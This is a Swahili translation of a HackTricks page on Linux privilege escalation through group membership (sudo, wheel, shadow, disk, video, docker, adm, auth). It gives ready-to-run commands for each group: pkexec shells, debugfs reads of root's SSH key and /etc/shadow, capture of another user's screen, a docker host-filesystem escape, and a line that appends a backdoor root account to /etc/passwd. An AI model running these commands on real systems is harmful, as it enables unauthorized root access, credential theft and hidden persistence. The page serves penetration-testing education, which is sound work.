# Vikundi Vinavyovutia - Linux Privesc

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## Vikundi vya Sudo/Admin

### **PE - Njia ya 1**

**Marafiki**, **kwa chaguo-msingi (au kwa sababu baadhi ya programu inahitaji)** ndani ya faili ya **/etc/sudoers** unaweza kupata mistari hii:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Hii inamaanisha kwamba **mtumiaji yeyote ambaye ni mwanachama wa kikundi cha sudo au admin anaweza kutekeleza chochote kama sudo**.

Ikiwa hii ndiyo hali, **ili kuwa root unaweza tu kutekeleza**:
```
sudo su
```
### PE - Njia 2

Tafuta programu-jalizi zote za suid na angalia kama kuna programu-jalizi ya **Pkexec**:
```bash
find / -perm -4000 2>/dev/null
```
Ikiwa utagundua kuwa binary **pkexec ni binary ya SUID** na wewe ni mwanachama wa **sudo** au **admin**, huenda uweze kutekeleza binaries kama sudo kwa kutumia `pkexec`. Hii ni kwa sababu kawaida hizo ni makundi ndani ya **sera ya polkit**. Sera hii kimsingi inatambua ni makundi gani yanaweza kutumia `pkexec`. Angalia hivyo kwa kutumia:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Hapo utapata kikundi gani kinaruhusiwa kutekeleza **pkexec** na **kwa chaguo-msingi** katika baadhi ya disctros za linux, vikundi **sudo** na **admin** vinatokea.

**Ili kuwa mtumiaji mkuu unaweza kutekeleza**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
Ikiwa unajaribu kutekeleza **pkexec** na unapata **kosa** hili:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**Sio kwa sababu huna ruhusa lakini ni kwa sababu hauko kuunganishwa bila GUI**. Na kuna suluhisho kwa shida hii hapa: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Unahitaji **vikao vya ssh 2 tofauti**:

{% code title="kikao1" %}
```bash
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```
{% code title="kikao2" %}
```bash
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
{% endcode %}

## Kikundi cha Wheel

**Wakati mwingine**, **kwa chaguo-msingi** ndani ya faili ya **/etc/sudoers** unaweza kupata mstari huu:
```
%wheel	ALL=(ALL:ALL) ALL
```
Hii inamaanisha kwamba **mtumiaji yeyote ambaye ni mwanachama wa kikundi cha wheel anaweza kutekeleza chochote kama sudo**.

Ikiwa hii ndiyo hali, **ili kuwa root unaweza tu kutekeleza**:
```
sudo su
```
## Kikundi cha Shadow

Watumiaji kutoka **kikundi cha shadow** wanaweza **kusoma** faili ya **/etc/shadow**:
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
Kwa hiyo, soma faili na jaribu **kuvunja baadhi ya hashi**.

## Kikundi cha Diski

Haki hii ni karibu **sawa na ufikiaji wa root** kwa sababu unaweza kupata data yote ndani ya kifaa.

Faili: `/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Tafadhali kumbuka kuwa kwa kutumia debugfs unaweza pia **kuandika faili**. Kwa mfano, ili kuiga `/tmp/asd1.txt` kwenda `/tmp/asd2.txt` unaweza kufanya hivi:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Hata hivyo, ikiwa utajaribu **kuandika faili zinazomilikiwa na root** (kama vile `/etc/shadow` au `/etc/passwd`) utapata kosa la "**Ruhusa imekataliwa**".

## Kikundi cha Video

Kwa kutumia amri `w` unaweza kupata **nani ameingia kwenye mfumo** na itaonyesha matokeo kama ifuatavyo:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1** inamaanisha kuwa mtumiaji **yossi ameingia kimwili** kwenye kifaa cha terminal kwenye kompyuta.

Kikundi cha **video** kina ruhusa ya kuona matokeo ya skrini. Kimsingi unaweza kuangalia skrini hizo. Ili kufanya hivyo, unahitaji **kunasa picha ya sasa kwenye skrini** kwa njia ya data safi na kupata azimio ambalo skrini inatumia. Data ya skrini inaweza kuokolewa kwenye `/dev/fb0` na unaweza kupata azimio la skrini hii kwenye `/sys/class/graphics/fb0/virtual_size`.
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Ku **fungua** **picha halisi** unaweza kutumia **GIMP**, chagua faili ya \*\*`screen.raw` \*\* na chagua aina ya faili kuwa **Raw image data**:

![](<../../../.gitbook/assets/image (287) (1).png>)

Kisha badilisha Upana na Urefu kuwa vile vilivyotumiwa kwenye skrini na angalia Aina Tofauti za Picha (na chagua ile inayoonyesha skrini vizuri zaidi):

![](<../../../.gitbook/assets/image (288).png>)

## Kikundi cha Root

Inaonekana kwa chaguo-msingi **wanachama wa kikundi cha root** wanaweza kupata ufikiaji wa **kubadilisha** baadhi ya faili za **mazingira ya huduma** au baadhi ya faili za **maktaba** au **vituko vingine vya kuvutia** ambavyo vinaweza kutumika kuongeza mamlaka...

**Angalia ni faili zipi wanachama wa root wanaweza kubadilisha**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Kikundi cha Docker

Unaweza **kufunga mfumo wa faili wa mizizi wa kifaa cha mwenyeji kwenye kiasi cha kifaa**, kwa hivyo wakati kifaa kinaanza, kinapakia moja kwa moja `chroot` kwenye kiasi hicho. Hii kimsingi inakupa udhibiti kamili wa kifaa.
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
Mwishowe, ikiwa hauipendi mapendekezo yoyote hapo awali, au hayafanyi kazi kwa sababu fulani (docker api firewall?), unaweza jaribu **kuendesha chombo kilichopewa ruhusa na kutoroka kutoka kwake** kama ilivyoelezwa hapa:

{% content-ref url="../docker-security/" %}
[docker-security](../docker-security/)
{% endcontent-ref %}

Ikiwa una ruhusa ya kuandika juu ya soketi ya docker soma [**chapisho hili kuhusu jinsi ya kuongeza mamlaka kwa kuvunja soketi ya docker**](../#writable-docker-socket)**.**

{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}

{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}

## Kikundi cha lxc/lxd

{% content-ref url="./" %}
[.](./)
{% endcontent-ref %}

## Kikundi cha Adm

Kawaida **wanachama** wa kikundi cha **`adm`** wana ruhusa ya **kusoma faili za logi** zilizopo ndani ya _/var/log/_.\
Kwa hivyo, ikiwa umedukua mtumiaji ndani ya kikundi hiki, hakika unapaswa **kuchunguza logi**.

## Kikundi cha Auth

Ndani ya OpenBSD, kikundi cha **auth** kawaida kinaweza kuandika kwenye folda za _**/etc/skey**_ na _**/var/db/yubikey**_ ikiwa zinatumika.\
Ruhusa hizi zinaweza kutumiwa vibaya na shambulio lifuatalo kwa **kuongeza mamlaka** hadi kwa mtumiaji mkuu: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
